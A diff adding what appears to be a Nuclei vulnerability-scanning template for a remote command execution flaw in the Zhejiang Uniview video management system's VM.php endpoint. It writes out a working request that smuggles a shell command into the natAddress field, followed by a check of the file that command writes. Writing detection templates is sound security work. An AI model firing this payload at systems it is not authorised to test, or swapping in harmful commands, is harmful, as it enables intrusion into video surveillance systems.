@@ -1,0 +1,36 @@
+id: zhejiangyushi-VM-rce
+
+info:
+  name: 浙江宇视视频管理系统 VM.php 接口存在远程命令执行漏洞
+  author: zhejiangyushi
+  severity: critical
+  tags: zhejiangyushi
+
+http:
+  - raw:
+      - |
+        POST /Interface/DevManage/VM.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+
+        cmd=setNatConfig&natAddress=%26echo%20d1536gs9fpwk%20>d2w6w9opj3g.txt
+
+      - |+
+        GET /Interface/DevManage/d2w6w9opj3g.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - 'd1536gs9fpwk'
+    matchers-condition: and
